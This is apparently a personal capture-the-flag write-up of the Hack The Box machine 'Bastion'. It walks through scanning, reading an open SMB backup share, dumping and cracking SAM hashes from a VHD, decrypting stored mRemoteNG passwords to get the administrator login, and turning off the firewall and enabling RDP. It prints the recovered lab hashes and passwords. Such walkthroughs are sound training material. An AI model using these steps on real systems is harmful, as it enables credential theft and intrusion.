---
title: HTB-Bastion
date: "2019-08-24"
description: easy box on HTB with Samba share containing a VHD file that leaked information. And then encrypted passwords with mRemoteNG which were cracked.
tldr: SMB, VHD, mRemoteNG
tags: [linux,smb,vhd,mremoteng,htb]
---

## Information Gathering 
The IP of the server is: `10.10.10.134`


## Scanning

### Nmap
A rather verbose scan was performed to see what type of ports that are up/open. 

```shell
nmap -sC -sV -p- -e tun0 -oA nmap/bastion 10.10.10.134

Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-24 20:21 CEST
Verbosity Increased to 1.
Verbosity Increased to 2.
Verbosity Increased to 3.
Completed Parallel DNS resolution of 1 host. at 20:22, 13.00s elapsed
DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating SYN Stealth Scan at 20:22
Scanning 10.10.10.134 [65535 ports]
Discovered open port 135/tcp on 10.10.10.134
Discovered open port 139/tcp on 10.10.10.134
Discovered open port 22/tcp on 10.10.10.134
Discovered open port 445/tcp on 10.10.10.134
Discovered open port 49665/tcp on 10.10.10.134
Discovered open port 49667/tcp on 10.10.10.134
Discovered open port 49669/tcp on 10.10.10.134
Discovered open port 49664/tcp on 10.10.10.134
Discovered open port 49670/tcp on 10.10.10.134
Discovered open port 5985/tcp on 10.10.10.134
Discovered open port 47001/tcp on 10.10.10.134
Discovered open port 49668/tcp on 10.10.10.134
Discovered open port 49666/tcp on 10.10.10.134
Completed SYN Stealth Scan at 20:22, 27.31s elapsed (65535 total ports)
Initiating Service scan at 20:22
Scanning 13 services on 10.10.10.134
Service scan Timing: About 53.85% done; ETC: 20:24 (0:00:46 remaining)
Completed Service scan at 20:23, 54.08s elapsed (13 services on 1 host)
NSE: Script scanning 10.10.10.134.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:23
Completed NSE at 20:23, 9.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:23
Completed NSE at 20:23, 0.00s elapsed
Nmap scan report for 10.10.10.134
Host is up (0.033s latency).
Scanned at 2019-08-24 20:21:52 CEST for 105s
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -47m22s, deviation: 1h09m14s, median: -7m24s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34629/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 26941/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19185/udp): CLEAN (Timeout)
|   Check 4 (port 18741/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-08-24T20:16:08+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-24 20:16:06
|_  start_date: 2019-08-24 20:10:10

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:23
Completed NSE at 20:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:23
Completed NSE at 20:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.22 seconds
           Raw packets sent: 65837 (2.897MB) | Rcvd: 65537 (2.622MB)
```

Open ports found: 

| Open ports |
|-------------|
| 135 |
| 139 |
| 22 |
| 445 |
| 49665 |
| 49667 |
| 49669 |
| 49664 |
| 49670 |
| 5985 |
| 47001 |
| 49668 |
| 49666 |


## Enumeration

### Metasploit
Trying out a module in metasploit to see whether we can gather some information from the `5985` port. 
[metaploit-link](https://blog.rapid7.com/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit/)


```shell
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > show options

Module options (auxiliary/scanner/winrm/winrm_auth_methods):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DOMAIN   WORKSTATION      yes       The domain to use for Windows authentification
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    5985             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads
   URI      /wsman           yes       The URI of the WinRM service
   VHOST                     no        HTTP server virtual host

msf5 auxiliary(scanner/winrm/winrm_auth_methods) > set RHOSTS 10.10.10.134
RHOSTS => 10.10.10.134
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > run

[+] 10.10.10.134:5985: Negotiate protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > services 
Services
========

host          port  proto  name   state  info
----          ----  -----  ----   -----  ----
10.10.10.134  5985  tcp    winrm  open   Microsoft-HTTPAPI/2.0 Authentication Methods: ["Negotiate"]
```

### SMBclient
Because it looks like a windows server, it's always good to check any eventual shares that can be accessible.

```shell
# smbclient -L //10.10.10.134
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Here the `Backups` folder looks to be of interest, so we try to mount it and browse around.

```shell
apt install libguestfs-tools cifs-utils

mkdir /mnt/bastion

mount -t cifs //10.10.10.134/Backups /mnt/bastion -o rw
```

in the folder we found a VHD file, which can be mounted and examined, here's how to do it in kali: [link](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

```shell
mkdir /mnt/bastionVHD

guestmount --add "/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /mnt/bastionVHD -v
```

After browsing around in that share, we found the user: `L4mpje` , and we can also copy the `SAM` and `System` file.

copy it over to Kali in order to get some hashes that we might be able to crack.

```shell
SAM & System file
/mnt/bastionVHD/Windows/System32/config

copy to /root/HTB/bastion/
# samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

```

### Hash cracking

#### John
John didn't produce any result as far as I could see, or it took too long so i switched over to Hashcat instead. 

```shell
john --format=LM --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```

#### Hashcat
A personal preference tends to be hashcat over john, but that's because i can utilize the GPU and get some better performance instead of using John inside the VM.

```shell
hashcat64 -m 1000 -a 0 hash.txt rockyou.txt
26112010952d963c8dc4217daec986d9:bureaulampje
```

Great, now we have a user and a password, time to get to the next step.

## Exploitation
Because port `22` is open, we try the found credentials with the SSH port and see that it's possible to login.

```shell
ssh L4mpje@10.10.10.134 

user: L4mpje 
pass: bureaulampje

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                                            
9bfe57d5c3309db3a151772f9d86c6cd      
```


## Privilege Escalation
After some internal enumeration on the box, an interesting folder was found with some configuration files in a XML format. 

```shell
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>
type confCons.xml

Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"

Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```

And after some googling, a python script to decrypt those types of passwords was found: [github](https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py)

trying out the python script on the encrypted passwords, we get the following: 

```shell
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2

python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
Password: bureaulampje
```

Now that we have the Administrator password, all that is left to do is just SSH in as the administrator.

```shell
Microsoft Windows [Version 10.0.14393]         
(c) 2016 Microsoft Corporation. All rights
reserved.                                     

administrator@BASTION
C:\Users\Administrator>whoami
bastion\administrator
```

just for fun, try to turn off the firewall and RDP to the machine: 

```shell
netsh advfirewall set allprofiles state off

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Note to self: remember to document the flags! forgot to document the root flag on this box.

## EOF
